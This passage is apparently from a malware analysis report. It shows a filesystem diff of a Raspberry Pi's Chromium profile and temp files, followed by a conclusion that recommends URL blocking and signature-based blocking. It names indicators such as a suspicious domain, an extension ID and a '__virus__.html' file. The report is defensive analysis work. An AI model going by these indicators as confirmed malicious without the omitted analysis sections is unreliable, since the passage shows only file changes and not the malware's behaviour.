    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/e
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/f
    extra:    home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.leveldb/LOG.old
    extra:    home/rpi/.config/chromium/Default/IndexedDB/https_keepongoingmaurice.info_0.indexeddb.leveldb
    extra:    home/rpi/.config/chromium/Default/LOG.old
    extra:    home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000005.ldb
    extra:    home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000007.ldb
    extra:    home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000008.log
    extra:    home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000009.ldb
    extra:    home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/LOG.old
    extra:    home/rpi/.config/chromium/Default/Local Storage/leveldb/LOG.old
    extra:    home/rpi/.config/chromium/Default/Managed Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/LOG.old
    extra:    home/rpi/.config/chromium/Default/PersistentOriginTrials/LOG.old
    extra:    home/rpi/.config/chromium/Default/Platform Notifications
    extra:    home/rpi/.config/chromium/Default/Segmentation Platform/SegmentInfoDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/Segmentation Platform/SignalDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/Segmentation Platform/SignalStorageConfigDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/Service Worker/Database/LOG.old
    extra:    home/rpi/.config/chromium/Default/Service Worker/ScriptCache/4cb013792b196a35_0
    extra:    home/rpi/.config/chromium/Default/Service Worker/ScriptCache/f1cdccba37924bda_0
    extra:    home/rpi/.config/chromium/Default/Service Worker/ScriptCache/f1cdccba37924bda_1
    extra:    home/rpi/.config/chromium/Default/Session Storage/LOG.old
    extra:    home/rpi/.config/chromium/Default/Sessions/Session_13374934981900065
    extra:    home/rpi/.config/chromium/Default/Sessions/Tabs_13374934981549461
    extra:    home/rpi/.config/chromium/Default/Site Characteristics Database/LOG.old
    extra:    home/rpi/.config/chromium/Default/Sync Data/LevelDB/LOG.old
    extra:    home/rpi/.config/chromium/Default/blob_storage/8dd7ad03-73f5-441d-b97a-02e87e9562ca
    extra:    home/rpi/.config/chromium/Default/commerce_subscription_db/LOG.old
    extra:    home/rpi/.config/chromium/Default/discounts_db/LOG.old
    extra:    home/rpi/.config/chromium/Default/optimization_guide_hint_cache_store/LOG.old
    extra:    home/rpi/.config/chromium/Default/parcel_tracking_db/LOG.old
    extra:    home/rpi/.config/chromium/Default/shared_proto_db/LOG.old
    extra:    home/rpi/.config/chromium/Default/shared_proto_db/metadata/LOG.old
    extra:    home/rpi/.config/chromium/FileTypePolicies/67
    extra:    home/rpi/.config/chromium/MEIPreload/1.0.7.1652906823
    extra:    home/rpi/.config/chromium/OnDeviceHeadSuggestModel/20241018.689539685.14
    extra:    home/rpi/.config/chromium/OptimizationHints/473
    extra:    home/rpi/.config/chromium/OriginTrials/1.0.0.17
    extra:    home/rpi/.config/chromium/PrivacySandboxAttestationsPreloaded/2024.10.30.0
    extra:    home/rpi/.config/chromium/SSLErrorAssistant/7
    extra:    home/rpi/.config/chromium/SafetyTips/3048
    extra:    home/rpi/.config/chromium/Subresource Filter/Indexed Rules
    extra:    home/rpi/.config/chromium/Subresource Filter/Unindexed Rules/9.52.0
    extra:    home/rpi/.config/chromium/TrustTokenKeyCommitments/2024.10.11.1
    extra:    home/rpi/.config/chromium/ZxcvbnData/3
    extra:    home/rpi/.config/chromium/component_crx_cache
    extra:    home/rpi/.config/chromium/hyphen-data/120.0.6050.0
    extra:    home/rpi/Documents/__virus__/__virus__.html
    extra:    tmp/.org.chromium.Chromium.3ZeX73
    extra:    tmp/.org.chromium.Chromium.7ussBG
    extra:    tmp/.org.chromium.Chromium.9dYuTl
    extra:    tmp/.org.chromium.Chromium.TMYAQz
    extra:    tmp/.org.chromium.Chromium.aW8OcG
    extra:    tmp/.org.chromium.Chromium.bCDcwx
    extra:    tmp/.org.chromium.Chromium.c1n7oZ
    extra:    tmp/.org.chromium.Chromium.o8pmi8
    extra:    tmp/.org.chromium.Chromium.p9y5WY
    extra:    tmp/.org.chromium.Chromium.qmFcDs
    extra:    tmp/.org.chromium.Chromium.u0utgP
    extra:    tmp/.org.chromium.Chromium.w47S42
    extra:    tmp/.org.chromium.Chromium.yl7bMr
    extra:    tmp/.org.chromium.Chromium.z3OtdE
    extra:    var/cache/apt/pkgcache.bin
    extra:    var/cache/apt/srcpkgcache.bin
    extra:    var/log/journal/009e558b493d432fa06e64ca303284b4/system@000625d8361f07c2-130494a6c359536a.journal~

    missing:  ./home/rpi/.config/chromium/Default/Extensions/Temp
    missing:  ./home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/2
    missing:  ./home/rpi/.config/chromium/Default/IndexedDB/chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm_0.indexeddb.blob/1/00/3
    missing:  ./home/rpi/.config/chromium/Default/Local Extension Settings/cjpalhdlnbpafiamejdnhcphjbkeiagm/000003.log
    missing:  ./home/rpi/.config/chromium/Default/blob_storage/e3f2ba0c-8d2e-4bae-8fc0-725ccdf07c40
    missing:  ./tmp/.org.chromium.Chromium.1xhJ42
    missing:  ./tmp/.org.chromium.Chromium.2xOQf6
    missing:  ./tmp/.org.chromium.Chromium.VfnsRA
    missing:  ./tmp/.org.chromium.Chromium.a7YffX
    missing:  ./tmp/.org.chromium.Chromium.i99GIS
    missing:  ./tmp/.org.chromium.Chromium.nA4Aew

## 8. Conclusion

A more detailed static analysis is necessary to assess the exact functioning of the malware, but the proposed URL blocking (see propositions at the top of this document) and blocking content with the malware signartures (see 6.4.1, 6.4.2, 6.4.3) should be sufficient to protoct against this malware.
